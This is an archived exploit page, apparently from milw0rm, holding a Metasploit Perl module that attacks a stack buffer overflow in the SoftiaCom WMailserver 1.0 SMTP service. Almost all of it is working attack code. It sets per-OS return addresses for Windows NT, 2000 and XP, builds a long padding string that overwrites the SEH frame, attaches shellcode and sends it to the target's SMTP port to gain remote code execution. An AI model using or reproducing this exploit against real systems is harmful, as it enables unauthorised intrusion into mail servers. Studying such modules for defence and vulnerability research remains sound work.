<html><head><title>SoftiaCom WMailserver 1.0 SMTP Remote Buffer Overflow Exploit (meta)</title></head><pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wmailserver_smtp;
use base &quot;Msf::Exploit&quot;;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'     =&gt; 'SoftiaCom WMailserver 1.0 SMTP Buffer Overflow',
	'Version'  =&gt; '$Revision: 1.1 $',
	'Authors'  =&gt; [ 'y0 [at] w00t-shell.net', ],
	'Arch'  =&gt; [ 'x86' ],
	'OS'    =&gt; [ 'win32', 'winnt', 'win2000', 'winxp' ],
	'Priv'  =&gt; 0,
	'UserOpts'  =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The target port', 25],
		'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' =&gt; { 'EXITFUNC' =&gt; 'thread' },
	'Payload' =&gt;
	  {
		'Space'     =&gt; 600,
		'BadChars'  =&gt; &quot;\x00\x0a\x0d\x20:=+\x22&quot;,
		'Prepend'   =&gt; &quot;\x81\xc4\xff\xef\xff\xff\x44&quot;,
		'Keys'      =&gt; ['+ws2ord'],
	  },

	'Description'  =&gt; Pex::Text::Freeform(qq{
	This module exploits a stack overflow in SoftiaCom WMailserver 1.0 (SMTP)
	via a SEH frame overwrite.
}),

	'Refs'  =&gt;
	  [
		['CVE', 'CAN-2005-2287'],
		['BID', '14213'],
	  ],
	'Targets' =&gt;
	  [
		['Windows NT 4.0 English SP4/SP5/SP6', 0x776a1799],
		['Windows 2000 English ALL', 0x75022ac4],
		['Windows XP English SP0/SP1', 0x71aa32ad],
	  ],
	'Keys' =&gt; ['smtp'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_idx  = $self-&gt;GetVar('TARGET');
	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	my $target = $self-&gt;Targets-&gt;[$target_idx];

	if (! $self-&gt;InitNops(128)) {
		$self-&gt;PrintLine(&quot;[*] Failed to initialize the nop module.&quot;);
		return;
	}

	my $splat  = Pex::Text::UpperCaseText(5117);

	my $sploit =
	  &quot; &quot;. $splat. &quot;\xeb\x06&quot;. pack('V', $target-&gt;[1]).
	  $shellcode. &quot;\r\n\r\n&quot;;

	$self-&gt;PrintLine(sprintf(&quot;[*] Trying to exploit target %s 0x%.8x&quot;, $target-&gt;[0], $target-&gt;[1]));

	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; $target_port,
		'LocalPort' =&gt; $self-&gt;GetVar('CPORT'),
		'SSL'       =&gt; $self-&gt;GetVar('SSL'),
	  );
	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return;
	}

	$s-&gt;Send($sploit);
	$self-&gt;Handler($s);
	$s-&gt;Close();
	return;
}

1;

# milw0rm.com [2006-02-01]</pre></html>